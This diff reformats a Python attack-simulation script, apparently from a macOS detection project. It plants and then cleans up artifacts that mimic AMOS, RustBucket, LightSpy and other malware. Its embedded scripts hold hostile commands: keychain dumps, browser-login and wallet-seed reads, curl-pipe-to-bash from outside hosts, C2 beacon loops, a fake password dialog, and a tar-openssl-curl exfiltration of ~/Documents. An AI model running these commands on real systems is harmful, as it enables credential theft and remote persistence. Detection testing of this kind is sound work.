@@ -45,21 +45,22 @@ MARKER = "AMOSKYS_ATTACK_SIM"  # Marker to identify our artifacts
 
 # ── ANSI ──────────────────────────────────────────────────────────────────
 class C:
-    RESET   = "\033[0m"
-    BOLD    = "\033[1m"
-    DIM     = "\033[2m"
-    RED     = "\033[31m"
-    GREEN   = "\033[32m"
-    YELLOW  = "\033[33m"
-    BLUE    = "\033[34m"
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
+    DIM = "\033[2m"
+    RED = "\033[31m"
+    GREEN = "\033[32m"
+    YELLOW = "\033[33m"
+    BLUE = "\033[34m"
     MAGENTA = "\033[35m"
-    CYAN    = "\033[36m"
-    WHITE   = "\033[37m"
-    BG_RED  = "\033[41m"
+    CYAN = "\033[36m"
+    WHITE = "\033[37m"
+    BG_RED = "\033[41m"
     BG_GREEN = "\033[42m"
 
 
 # ── Artifact Tracker ─────────────────────────────────────────────────────
+
 
 class ArtifactTracker:
     """Track all planted artifacts for cleanup."""
@@ -102,10 +103,13 @@ tracker = ArtifactTracker()
 # Probes expected: LaunchAgentProbe, ScriptInterpreterProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_amos_stealer():
     """Simulate AMOS/Atomic Stealer persistence + credential harvesting."""
     print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 1: AMOS/Atomic Stealer {C.RESET}")
-    print(f"  {C.RED}TTP: T1555.001 (Keychain) + T1543.001 (LaunchAgent) + T1059.002 (AppleScript){C.RESET}")
+    print(
+        f"  {C.RED}TTP: T1555.001 (Keychain) + T1543.001 (LaunchAgent) + T1059.002 (AppleScript){C.RESET}"
+    )
 
     # 1a. Create malicious LaunchAgent (persistence)
     la_dir = HOME / "Library" / "LaunchAgents"
@@ -115,7 +119,8 @@ def attack_amos_stealer():
     plist_data = {
         "Label": "com.amos.stealer.update",
         "ProgramArguments": [
-            "/usr/bin/osascript", "-e",
+            "/usr/bin/osascript",
+            "-e",
             'tell application "System Preferences" to activate',
             "-e",
             'display dialog "macOS wants to access your Keychain. Enter password:" with hidden answer default answer ""',
@@ -136,20 +141,24 @@ def attack_amos_stealer():
 
     # 1b. Create the credential harvesting script (osascript pattern)
     steal_script = Path("/tmp/.amos_harvest.sh")
-    steal_script.write_text(f"""#!/bin/bash
+    steal_script.write_text(
+        f"""#!/bin/bash
 # {MARKER} — AMOS Stealer Simulation
 # Real AMOS targets: ~/Library/Keychains, browser profiles, crypto wallets
 security find-generic-password -a "$USER" 2>/dev/null
 sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data "SELECT origin_url FROM logins" 2>/dev/null
 cat ~/Library/Application\\ Support/Exodus/exodus.wallet/seed.seco 2>/dev/null
-""")
+"""
+    )
     steal_script.chmod(0o755)
     tracker.track_file(steal_script)
     print(f"  {C.YELLOW}[PLANTED]{C.RESET} Credential script: {steal_script}")
 
     # 1c. Hidden output log (exfil staging)
     hidden_log = Path("/tmp/.amos_output.log")
-    hidden_log.write_text(f"# {MARKER}\nstaged_credentials=true\ntarget_wallets=exodus,metamask,phantom\n")
+    hidden_log.write_text(
+        f"# {MARKER}\nstaged_credentials=true\ntarget_wallets=exodus,metamask,phantom\n"
+    )
     tracker.track_file(hidden_log)
     print(f"  {C.YELLOW}[PLANTED]{C.RESET} Hidden exfil staging: {hidden_log}")
 
@@ -163,10 +172,15 @@ cat ~/Library/Application\\ Support/Exodus/exodus.wallet/seed.seco 2>/dev/null
 # Probes expected: BinaryFromTempProbe, ProcessSpawnProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_rustbucket():
     """Simulate RustBucket multi-stage payload delivery."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 2: RustBucket (DPRK/BlueNoroff) {C.RESET}")
-    print(f"  {C.RED}TTP: T1204 (User Execution) + T1036 (Masquerading) + T1059 (Scripting){C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 2: RustBucket (DPRK/BlueNoroff) {C.RESET}"
+    )
+    print(
+        f"  {C.RED}TTP: T1204 (User Execution) + T1036 (Masquerading) + T1059 (Scripting){C.RESET}"
+    )
 
     # 2a. Stage 1: AppleScript stager disguised as PDF viewer
     stager = Path("/tmp/Shared_Prospect_Document.app")
@@ -177,13 +191,15 @@ def attack_rustbucket():
     stager_bin.mkdir(parents=True, exist_ok=True)
 
     stager_script = stager_bin / "Shared_Prospect_Document"
-    stager_script.write_text(f"""#!/bin/bash
+    stager_script.write_text(
+        f"""#!/bin/bash
 # {MARKER} — RustBucket Stage 1 Simulation
 # Real RustBucket: AppleScript → downloads Swift payload
 curl -s http://185.62.56.99/stage2.bin -o /tmp/.rustbucket_s2 2>/dev/null
 chmod +x /tmp/.rustbucket_s2 2>/dev/null
 /tmp/.rustbucket_s2 2>/dev/null
-""")
+"""
+    )
     stager_script.chmod(0o755)
     tracker.track_file(stager_script)
 
@@ -202,13 +218,15 @@ chmod +x /tmp/.rustbucket_s2 2>/dev/null
 
     # 2c. Stage 3: Second dropper with suspicious name
     dropper = Path("/tmp/.update_helper")
-    dropper.write_text(f"""#!/bin/bash
+    dropper.write_text(
+        f"""#!/bin/bash
 # {MARKER} — RustBucket Stage 3
 while true; do
     curl -s -X POST https://185.62.56.99/beacon -d "host=$(hostname)&user=$(whoami)" 2>/dev/null
     sleep 300
 done
-""")
+"""
+    )
     dropper.chmod(0o755)
     tracker.track_file(dropper)
 
@@ -226,9 +244,12 @@ done
 # Probes expected: ShellProfileProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_todoswift():
     """Simulate ToDoSwift shell profile persistence."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 3: ToDoSwift (BlueNoroff .zshenv) {C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 3: ToDoSwift (BlueNoroff .zshenv) {C.RESET}"
+    )
     print(f"  {C.RED}TTP: T1546.004 (Unix Shell Profile Modification){C.RESET}")
 
     zshenv = HOME / ".zshenv"
@@ -252,7 +273,9 @@ export ZDOTDIR=/tmp/.hidden_zsh
     if bash_profile.exists():
         tracker.backup_file(bash_profile)
     with open(bash_profile, "a") as f:
-        f.write(f"\n# {MARKER}\ncurl -s http://185.62.56.99/update.sh | bash &>/dev/null &\n")
+        f.write(
+            f"\n# {MARKER}\ncurl -s http://185.62.56.99/update.sh | bash &>/dev/null &\n"
+        )
     tracker.track_file(bash_profile)
     print(f"  {C.YELLOW}[PLANTED]{C.RESET} Bash persistence in: {bash_profile}")
 
@@ -266,9 +289,12 @@ export ZDOTDIR=/tmp/.hidden_zsh
 # Probes expected: LaunchAgentProbe (UUID name = suspicious)
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_backdoor_activator():
     """Simulate Backdoor Activator UUID persistence."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 4: Backdoor Activator (UUID Persistence) {C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 4: Backdoor Activator (UUID Persistence) {C.RESET}"
+    )
     print(f"  {C.RED}TTP: T1543.001 (LaunchAgent) + T1543.004 (LaunchDaemon){C.RESET}")
 
     # UUID-named LaunchAgent (the real detection challenge)
@@ -278,8 +304,11 @@ def attack_backdoor_activator():
 
     plist_data = {
         "Label": fake_uuid,
-        "ProgramArguments": ["/bin/bash", "-c",
-            "while true; do curl -s http://45.77.123.45/c2 -o /dev/null; sleep 600; done"],
+        "ProgramArguments": [
+            "/bin/bash",
+            "-c",
+            "while true; do curl -s http://45.77.123.45/c2 -o /dev/null; sleep 600; done",
+        ],
         "RunAtLoad": True,
         "KeepAlive": True,
         "Comment": MARKER,
@@ -300,10 +329,15 @@ def attack_backdoor_activator():
 # Probes expected: HiddenFileProbe, BinaryFromTempProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_lightspy():
     """Simulate LightSpy hidden surveillance framework."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 5: LightSpy (APT41 Surveillance) {C.RESET}")
-    print(f"  {C.RED}TTP: T1564.001 (Hidden Files) + T1005 (Data from Local System){C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 5: LightSpy (APT41 Surveillance) {C.RESET}"
+    )
+    print(
+        f"  {C.RED}TTP: T1564.001 (Hidden Files) + T1005 (Data from Local System){C.RESET}"
+    )
 
     # Hidden surveillance directory
     spy_dir = Path("/tmp/.lightspy_framework")
@@ -339,14 +373,21 @@ def attack_lightspy():
 # Probes expected: DylibInjectionProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_beavertail_dyld():
     """Simulate BeaverTail DYLD injection."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 6: BeaverTail (DYLD Injection) {C.RESET}")
-    print(f"  {C.RED}TTP: T1055.001 (DYLD Hijacking) + T1574.004 (Dylib Hijacking){C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 6: BeaverTail (DYLD Injection) {C.RESET}"
+    )
+    print(
+        f"  {C.RED}TTP: T1055.001 (DYLD Hijacking) + T1574.004 (Dylib Hijacking){C.RESET}"
+    )
 
     # Create fake malicious dylib
     fake_dylib = Path("/tmp/.libhook_inject.dylib")
-    fake_dylib.write_text(f"# {MARKER}\n# Fake dylib for DYLD_INSERT_LIBRARIES injection\n")
+    fake_dylib.write_text(
+        f"# {MARKER}\n# Fake dylib for DYLD_INSERT_LIBRARIES injection\n"
+    )
     fake_dylib.chmod(0o755)
     tracker.track_file(fake_dylib)
 
@@ -364,7 +405,9 @@ def attack_beavertail_dyld():
             stderr=subprocess.DEVNULL,
         )
         tracker.track_process(proc.pid)
-        print(f"  {C.YELLOW}[SPAWNED]{C.RESET} Process with DYLD injection: PID {proc.pid}")
+        print(
+            f"  {C.YELLOW}[SPAWNED]{C.RESET} Process with DYLD injection: PID {proc.pid}"
+        )
         print(f"  {C.YELLOW}         {C.RESET} DYLD_INSERT_LIBRARIES={fake_dylib}")
     except Exception as e:
         print(f"  {C.RED}[FAILED]{C.RESET} DYLD spawn: {e}")
@@ -378,9 +421,12 @@ def attack_beavertail_dyld():
 # Probes expected: SSHKeyProbe, CronProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_ssh_cron():
     """Simulate SSH key injection and cron persistence."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 7: APT SSH + Cron Persistence {C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 7: APT SSH + Cron Persistence {C.RESET}"
+    )
     print(f"  {C.RED}TTP: T1098.004 (SSH Keys) + T1053.003 (Cron){C.RESET}")
 
     # 7a. Inject SSH authorized key
@@ -412,8 +458,7 @@ def attack_ssh_cron():
 
     try:
         proc = subprocess.run(
-            ["crontab", "-"], input=new_crontab, text=True,
-            capture_output=True
+            ["crontab", "-"], input=new_crontab, text=True, capture_output=True
         )
         tracker.track_cron(cron_entry)
         print(f"  {C.YELLOW}[PLANTED]{C.RESET} Cron job: {cron_entry}")
@@ -429,14 +474,18 @@ def attack_ssh_cron():
 # Probes expected: LOLBinProbe, ScriptInterpreterProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_lolbin_chain():
     """Simulate LOLBin abuse and script interpreter chain."""
     print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 8: LOLBin Abuse Chain {C.RESET}")
-    print(f"  {C.RED}TTP: T1218 (LOLBins) + T1059.002 (AppleScript) + T1059.004 (Shell){C.RESET}")
+    print(
+        f"  {C.RED}TTP: T1218 (LOLBins) + T1059.002 (AppleScript) + T1059.004 (Shell){C.RESET}"
+    )
 
     # 8a. Script that pipes curl to bash (classic dropper pattern)
     dropper = Path("/tmp/.system_updater.sh")
-    dropper.write_text(f"""#!/bin/bash
+    dropper.write_text(
+        f"""#!/bin/bash
 # {MARKER} — LOLBin Chain Simulation
 # Pattern: curl | bash (one of the most common macOS attack vectors)
 curl -sL http://evil.example.com/payload.sh | /bin/bash
@@ -448,7 +497,8 @@ osascript -e 'display dialog "Software Update requires your password" with hidde
 security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>/dev/null
 # Pattern: openssl for data encoding (exfil)
 tar czf - ~/Documents 2>/dev/null | openssl enc -aes-256-cbc -k "c2key" | curl -X POST -d @- http://exfil.example.com/upload
-""")
+"""
+    )
     dropper.chmod(0o755)
     tracker.track_file(dropper)
 
@@ -457,7 +507,8 @@ tar czf - ~/Documents 2>/dev/null | openssl enc -aes-256-cbc -k "c2key" | curl -
     try:
         proc = subprocess.Popen(
             ["/usr/bin/osascript", "-e", "delay 120"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
         tracker.track_process(proc.pid)
         print(f"  {C.YELLOW}[SPAWNED]{C.RESET} osascript process: PID {proc.pid}")
@@ -467,8 +518,15 @@ tar czf - ~/Documents 2>/dev/null | openssl enc -aes-256-cbc -k "c2key" | curl -
     # 8c. curl with suspicious target (background, will fail harmlessly)
     try:
         proc = subprocess.Popen(
-            ["/usr/bin/curl", "-s", "--max-time", "120", "http://185.62.56.99:8443/beacon"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            [
+                "/usr/bin/curl",
+                "-s",
+                "--max-time",
+                "120",
+                "http://185.62.56.99:8443/beacon",
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
         )
         tracker.track_process(proc.pid)
         print(f"  {C.YELLOW}[SPAWNED]{C.RESET} curl C2 beacon: PID {proc.pid}")
@@ -485,6 +543,7 @@ tar czf - ~/Documents 2>/dev/null | openssl enc -aes-256-cbc -k "c2key" | curl -
 # Real: Malware names itself after system processes
 # Probes expected: ProcessMasqueradeProbe, SuspiciousUserProbe
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 def attack_masquerade():
     """Simulate process name masquerading."""
@@ -507,10 +566,13 @@ def attack_masquerade():
         try:
             proc = subprocess.Popen(
                 [str(p)],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
             tracker.track_process(proc.pid)
-            print(f"  {C.YELLOW}[SPAWNED]{C.RESET} Fake {p.name}: PID {proc.pid} (from {p})")
+            print(
+                f"  {C.YELLOW}[SPAWNED]{C.RESET} Fake {p.name}: PID {proc.pid} (from {p})"
+            )
         except Exception as e:
             print(f"  {C.RED}[FAILED]{C.RESET} {p.name}: {e}")
 
@@ -523,9 +585,12 @@ def attack_masquerade():
 # Probes expected: SuidChangeProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_suid():
     """Simulate SUID bit manipulation."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 10: SUID Privilege Escalation {C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 10: SUID Privilege Escalation {C.RESET}"
+    )
     print(f"  {C.RED}TTP: T1548.001 (Setuid/Setgid){C.RESET}")
 
     suid_bin = Path("/tmp/.escalate_helper")
@@ -543,9 +608,12 @@ def attack_suid():
 # Probes expected: FolderActionProbe
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def attack_folder_action():
     """Simulate Folder Action persistence."""
-    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 11: Folder Action Persistence {C.RESET}")
+    print(
+        f"\n{C.BG_RED}{C.WHITE}{C.BOLD} ATTACK 11: Folder Action Persistence {C.RESET}"
+    )
     print(f"  {C.RED}TTP: T1546.015 (Folder Action Scripts){C.RESET}")
 
     fa_dir = HOME / "Library" / "Workflows" / "Applications" / "Folder Actions"
@@ -553,12 +621,14 @@ def attack_folder_action():
     tracker.track_dir(fa_dir)
 
     fa_script = fa_dir / "download_watcher.scpt"
-    fa_script.write_text(f"""-- {MARKER}
+    fa_script.write_text(
+        f"""-- {MARKER}
 -- Folder Action: trigger on new files in Downloads
 on adding folder items to this_folder after receiving added_items
     do shell script "/tmp/.amos_harvest.sh &"
 end adding folder items to
-""")
+"""
+    )
     tracker.track_file(fa_script)
     print(f"  {C.YELLOW}[PLANTED]{C.RESET} Folder Action: {fa_script}")
 
@@ -568,6 +638,7 @@ end adding folder items to
 # ═══════════════════════════════════════════════════════════════════════════
 # CLEANUP
 # ═══════════════════════════════════════════════════════════════════════════
+
 
 def cleanup():
     """Remove all planted artifacts."""
@@ -586,14 +657,14 @@ def cleanup():
     # Remove cron entries
     if tracker.cron_entries:
         try:
-            result = subprocess.run(
-                ["crontab", "-l"], capture_output=True, text=True
-            )
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
             lines = result.stdout.split("\n")
-            cleaned = [l for l in lines if MARKER not in l]
+            cleaned = [line for line in lines if MARKER not in line]
             subprocess.run(
-                ["crontab", "-"], input="\n".join(cleaned) + "\n",
-                text=True, capture_output=True
+                ["crontab", "-"],
+                input="\n".join(cleaned) + "\n",
+                text=True,
+                capture_output=True,
             )
             print(f"  {C.GREEN}[REMOVED]{C.RESET} Cron entries with marker")
         except Exception:
@@ -637,16 +708,25 @@ def cleanup():
 # MAIN
 # ═══════════════════════════════════════════════════════════════════════════
 
+
 def main():
     import argparse
+
     parser = argparse.ArgumentParser(description="AMOSKYS Attack Simulation")
-    parser.add_argument("--no-cleanup", action="store_true",
-                       help="Leave artifacts for manual inspection")
-    parser.add_argument("--plant-only", action="store_true",
-                       help="Only plant artifacts, don't run detection")
+    parser.add_argument(
+        "--no-cleanup",
+        action="store_true",
+        help="Leave artifacts for manual inspection",
+    )
+    parser.add_argument(
+        "--plant-only",
+        action="store_true",
+        help="Only plant artifacts, don't run detection",
+    )
     args = parser.parse_args()
 
-    print(f"""
+    print(
+        f"""
 {C.BG_RED}{C.WHITE}{C.BOLD}{'='*70}{C.RESET}
 {C.BG_RED}{C.WHITE}{C.BOLD}  AMOSKYS ATTACK SIMULATION — Real macOS Malware TTPs              {C.RESET}
 {C.BG_RED}{C.WHITE}{C.BOLD}{'='*70}{C.RESET}
@@ -665,7 +745,8 @@ def main():
   {C.RED}11.{C.RESET} Folder Action       — macOS folder action persistence
 
 {C.DIM}All artifacts are safe simulations. No actual malware or damage.{C.RESET}
-""")
+"""
+    )
 
     # ── Phase 1: Plant attack artifacts ──────────────────────────────────
     print(f"{C.BOLD}{'='*70}{C.RESET}")
@@ -698,7 +779,9 @@ def main():
     print(f"{C.BOLD}Processes spawned: {len(tracker.processes_spawned)}{C.RESET}")
 
     if args.plant_only:
-        print(f"\n{C.YELLOW}--plant-only: Skipping detection. Run collect_and_store.py manually.{C.RESET}")
+        print(
+            f"\n{C.YELLOW}--plant-only: Skipping detection. Run collect_and_store.py manually.{C.RESET}"
+        )
         if not args.no_cleanup:
             input(f"\n{C.BOLD}Press Enter to cleanup...{C.RESET}")
             cleanup()
@@ -708,20 +791,29 @@ def main():
     print(f"\n{C.BOLD}{'='*70}{C.RESET}")
     print(f"{C.BOLD} PHASE 2: RUNNING AMOSKYS DETECTION{C.RESET}")
     print(f"{'='*70}")
-    print(f"\n{C.CYAN}Running all 13 macOS Observatory agents against live system...{C.RESET}")
-    print(f"{C.DIM}Agents will scan the machine and probes will evaluate collected data.{C.RESET}\n")
+    print(
+        f"\n{C.CYAN}Running all 13 macOS Observatory agents against live system...{C.RESET}"
+    )
+    print(
+        f"{C.DIM}Agents will scan the machine and probes will evaluate collected data.{C.RESET}\n"
+    )
 
     # Import and run collect_and_store inline
     sys.argv = ["collect_and_store.py"]  # Reset argv for argparse
     import logging
+
     logging.basicConfig(
         level=logging.INFO,
         format="%(asctime)s | %(levelname)-5s | %(name)s | %(message)s",
         force=True,
     )
     for name in [
-        "amoskys.agents.common.queue_adapter", "amoskys.agents.common.base",
-        "urllib3", "google", "grpc", "protobuf",
+        "amoskys.agents.common.queue_adapter",
+        "amoskys.agents.common.base",
+        "urllib3",
+        "google",
+        "grpc",
+        "protobuf",
     ]:
         logging.getLogger(name).setLevel(logging.ERROR)
 
@@ -729,16 +821,11 @@ def main():
     scripts_dir = str(PROJECT_ROOT / "scripts")
     if scripts_dir not in sys.path:
         sys.path.insert(0, scripts_dir)
-    from collect_and_store import (
-        AGENTS, WALProcessor, collect_and_process,
-        DB_PATH,
-    )
+    from collect_and_store import AGENTS, DB_PATH, WALProcessor, collect_and_process
 
     processor = WALProcessor(store_path=DB_PATH)
     device_id = socket.gethostname()
-    total_events, total_detections = collect_and_process(
-        processor, AGENTS, device_id
-    )
+    total_events, total_detections = collect_and_process(processor, AGENTS, device_id)
 
     # ── Phase 3: Query and display detections ────────────────────────────
     print(f"\n{C.BOLD}{'='*70}{C.RESET}")
@@ -746,11 +833,13 @@ def main():
     print(f"{'='*70}\n")
 
     import sqlite3
+
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
 
     # Get all suspicious events (using actual schema columns)
-    suspicious = conn.execute("""
+    suspicious = conn.execute(
+        """
         SELECT event_category, event_outcome, risk_score, event_action,
                mitre_techniques, description, timestamp_dt, confidence,
                final_classification, collection_agent
@@ -760,11 +849,16 @@ def main():
            OR risk_score > 0.3
         ORDER BY risk_score DESC
         LIMIT 100
-    """).fetchall()
+    """
+    ).fetchall()
 
     if suspicious:
-        print(f"  {C.RED}{C.BOLD}DETECTIONS: {len(suspicious)} suspicious events{C.RESET}\n")
-        print(f"  {'Severity':<10} {'Risk':>5} {'Probe/Action':<35} {'MITRE':<20} {'Category'}")
+        print(
+            f"  {C.RED}{C.BOLD}DETECTIONS: {len(suspicious)} suspicious events{C.RESET}\n"
+        )
+        print(
+            f"  {'Severity':<10} {'Risk':>5} {'Probe/Action':<35} {'MITRE':<20} {'Category'}"
+        )
         print(f"  {'─'*10} {'─'*5} {'─'*35} {'─'*20} {'─'*25}")
 
         for row in suspicious:
@@ -783,25 +877,32 @@ def main():
             else:
                 color = C.CYAN
 
-            print(f"  {color}{sev:<10}{C.RESET} {risk:>5.2f} {probe:<35} {mitre:<20} {etype}")
+            print(
+                f"  {color}{sev:<10}{C.RESET} {risk:>5.2f} {probe:<35} {mitre:<20} {etype}"
+            )
     else:
         print(f"  {C.YELLOW}No suspicious events in security_events table.{C.RESET}")
         # Show ALL events for debugging
-        all_events = conn.execute("""
+        all_events = conn.execute(
+            """
             SELECT COUNT(*) as cnt, event_outcome, event_category
             FROM security_events
             GROUP BY event_outcome, event_category
             ORDER BY cnt DESC
             LIMIT 20
-        """).fetchall()
+        """
+        ).fetchall()
         if all_events:
             print(f"\n  All events by type:")
             for row in all_events:
-                print(f"    {row['cnt']:>5}x  {row['event_outcome'] or '?':<10} {row['event_category'] or '?'}")
+                print(
+                    f"    {row['cnt']:>5}x  {row['event_outcome'] or '?':<10} {row['event_category'] or '?'}"
+                )
 
     # Summary stats
     print(f"\n{C.BOLD}{'─'*70}{C.RESET}")
-    stats = conn.execute("""
+    stats = conn.execute(
+        """
         SELECT
             COUNT(*) as total,
             SUM(CASE WHEN requires_investigation = 1 THEN 1 ELSE 0 END) as suspicious,
@@ -812,10 +913,12 @@ def main():
             MAX(risk_score) as max_risk,
             COUNT(DISTINCT collection_agent) as agents_reporting
         FROM security_events
-    """).fetchone()
+    """
+    ).fetchone()
 
-    max_risk = stats['max_risk'] or 0.0
-    print(f"""
+    max_risk = stats["max_risk"] or 0.0
+    print(
+        f"""
   {C.BOLD}Detection Summary:{C.RESET}
     Total events:      {stats['total']}
     Needs investigation: {C.RED}{stats['suspicious']}{C.RESET}
@@ -825,32 +928,37 @@ def main():
     Low:               {C.CYAN}{stats['low']}{C.RESET}
     Max risk score:    {max_risk:.2f}
     Agents reporting:  {stats['agents_reporting']}
-""")
+"""
+    )
 
     # Show process detections
-    proc_sus = conn.execute("""
+    proc_sus = conn.execute(
+        """
         SELECT pid, exe, cmdline, is_suspicious, anomaly_score
         FROM process_events
         WHERE is_suspicious = 1
         ORDER BY anomaly_score DESC
         LIMIT 20
-    """).fetchall()
+    """
+    ).fetchall()
 
     if proc_sus:
         print(f"  {C.RED}{C.BOLD}FLAGGED PROCESSES:{C.RESET}")
         for p in proc_sus:
-            exe = (p["exe"] or "?")
+            exe = p["exe"] or "?"
             cmd = (p["cmdline"] or "")[:60]
             print(f"    PID {p['pid']:>6}  {exe}  {C.DIM}{cmd}{C.RESET}")
 
     # Show persistence detections
-    persist_sus = conn.execute("""
+    persist_sus = conn.execute(
+        """
         SELECT mechanism, path, risk_score
         FROM persistence_events
         WHERE risk_score > 0.3
         ORDER BY risk_score DESC
         LIMIT 20
-    """).fetchall()
+    """
+    ).fetchall()
 
     if persist_sus:
         print(f"\n  {C.RED}{C.BOLD}FLAGGED PERSISTENCE:{C.RESET}")
@@ -863,8 +971,12 @@ def main():
     if not args.no_cleanup:
         cleanup()
     else:
-        print(f"\n{C.YELLOW}--no-cleanup: Artifacts left in place for inspection.{C.RESET}")
-        print(f"{C.YELLOW}Run this script again without --no-cleanup to remove them.{C.RESET}")
+        print(
+            f"\n{C.YELLOW}--no-cleanup: Artifacts left in place for inspection.{C.RESET}"
+        )
+        print(
+            f"{C.YELLOW}Run this script again without --no-cleanup to remove them.{C.RESET}"
+        )
 
 
 if __name__ == "__main__":
